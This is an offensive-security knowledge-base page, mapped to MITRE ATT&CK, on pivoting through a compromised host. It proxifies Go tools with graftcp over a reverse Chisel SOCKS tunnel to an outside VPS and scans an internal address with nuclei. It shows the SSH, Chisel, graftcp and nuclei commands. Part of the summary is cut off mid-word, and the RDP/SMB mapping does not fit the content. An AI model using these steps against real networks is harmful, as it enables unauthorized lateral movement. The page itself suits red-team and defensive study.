---
id: 4e8b7b9d-a781-43b4-80eb-9f8fbb5956ed
name: Go Application Proxification with Graftcp
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:22.560667+00:00'
updated_at: '2023-04-10T20:25:14.758996+00:00'
tactics:
- '[[Lateral Movement|TA0008 - Lateral Movement]]'
techniques:
- '[[Remote Services|T1021 - Remote Services]]'
sub_techniques:
- '[[Remote Desktop Protocol|T1021.001 - Remote Desktop Protocol]]'
- '[[SMB/Windows Admin Shares|T1021.002 - SMB/Windows Admin Shares]]'
tags:
- '[[Graftcp]]'
- '[[Network Pivoting Techniques]]'
commands:
- '[[Configure graftcp local]]'
- '[[Create a SOCKS5 tunnel]]'
- '[[Run nuclei]]'
- '[[Start Chisel client]]'
- '[[Start Chisel server]]'
- '[[Start graftcp]]'
---

# Go Application Proxification with Graftcp

## Summary

This procedure allows an attacker to proxify a Go application using graftcp. By proxifying the application, the attacker can redirect traffic through a compromised host or network, effectively pivoting their attack. Graftcp is a simple and effective tool for this purpose, and can be easily configur

## Description

# Description

This procedure allows an attacker to proxify a Go application using graftcp. By proxifying the application, the attacker can redirect traffic through a compromised host or network, effectively pivoting their attack. Graftcp is a simple and effective tool for this purpose, and can be easily configured to work with Go applications. Technical details of this procedure involve configuring the graftcp proxy, modifying the Go application to use the proxy, and redirecting traffic through the compromised host or network. The business value of this procedure is that it allows an attacker to move laterally through a network and gain access to additional resources.

## Requirements

1. Access to a compromised host or network

1. Go application to proxify

1. Graftcp installed on compromised host or network

## Defense

1. Monitor network traffic for suspicious activity

1. Implement network segmentation to limit lateral movement

1. Use multi-factor authentication to prevent unauthorized access

## Objectives

1. Proxify a Go application using graftcp

1. Redirect traffic through a compromised host or network

1. Move laterally through a network

# Instructions

1. To use graftcp to proxify Go applications, follow these steps:
1. Create a SOCKS5 proxy using a tool like Chisel and forward it through SSH.
2. Run graftcp-local and specify the SOCKS5 proxy.
3. Run your Go application using graftcp.

**Code**: [[# https://github.com/hmgle/graftcp

# Create a SOC]]

> The above command demonstrates how to use graftcp to proxify Go applications. Graftcp is similar to proxychains, but it provides an alternative mechanism to proxify that allows Go applications to be proxified. To use graftcp, you first need to create a SOCKS5 proxy using a tool like Chisel and forward it through SSH. Then, you can run graftcp-local and specify the SOCKS5 proxy. Finally, you can run your Go application using graftcp. This will ensure that all traffic generated by the application is proxified through the SOCKS5 proxy.

**Command** ([[Create a SOCKS5 tunnel]]):

```bash
ssh -fNT -i /tmp/id_rsa -L 1080:127.0.0.1:1080 root@IP_VPS
```

**Command** ([[Start Chisel server]]):

```bash
./chisel server --tls-key ./key.pem --tls-cert ./cert.pem -p 8443 -reverse
```

**Command** ([[Start Chisel client]]):

```bash
./chisel client --tls-skip-verify https://IP_VPS:8443 R:socks
```

**Command** ([[Start graftcp]]):

```bash
graftcp-local -listen :2233 -logfile /tmp/toto -loglevel 6 -socks5 127.0.0.1:1080
```

**Command** ([[Run nuclei]]):

```bash
graftcp ./nuclei -u http://172.16.1.24
```

2. To use graftcp, you need to create a configuration file. The configuration file should have the following details:

1. Listen address: The address where graftcp should listen. The default is ":2233".
2. Log level: The level of logging to be used. The default is 1.
3. SOCKS5 address: The address of the SOCKS5 proxy to be used. The default is "127.0.0.1:1080".
4. SOCKS5 username and password (optional): If the SOCKS5 proxy requires authentication, you can specify the username and password here.
5. Select proxy mode: The mode for selecting a proxy. The default is "auto".

Once you have created the configuration file, you can use it with graftcp to tunnel your traffic through the specified proxy.

**Code**: [[# https://github.com/hmgle/graftcp/blob/master/loc]]

> 

**Command** ([[Configure graftcp local]]):

```bash
# https://github.com/hmgle/graftcp/blob/master/local/example-graftcp-local.conf
## Listen address (default ":2233")
listen = :2233
loglevel = 1

## SOCKS5 address (default "127.0.0.1:1080")
socks5 = 127.0.0.1:1080
# socks5_username = SOCKS5USERNAME
# socks5_password = SOCKS5PASSWORD

## Set the mode for select a proxy (default "auto")
select_proxy_mode = auto
```

## MITRE ATT&CK Mapping

### Tactics

- [[Lateral Movement|TA0008 - Lateral Movement]]

### Techniques

- [[Remote Services|T1021 - Remote Services]]

### Sub-Techniques

- [[Remote Desktop Protocol|T1021.001 - Remote Desktop Protocol]]
- [[SMB/Windows Admin Shares|T1021.002 - SMB/Windows Admin Shares]]

## Commands Used

- [[Configure graftcp local]]
- [[Create a SOCKS5 tunnel]]
- [[Run nuclei]]
- [[Start Chisel client]]
- [[Start Chisel server]]
- [[Start graftcp]]

## Tags

- [[Graftcp]]
- [[Network Pivoting Techniques]]
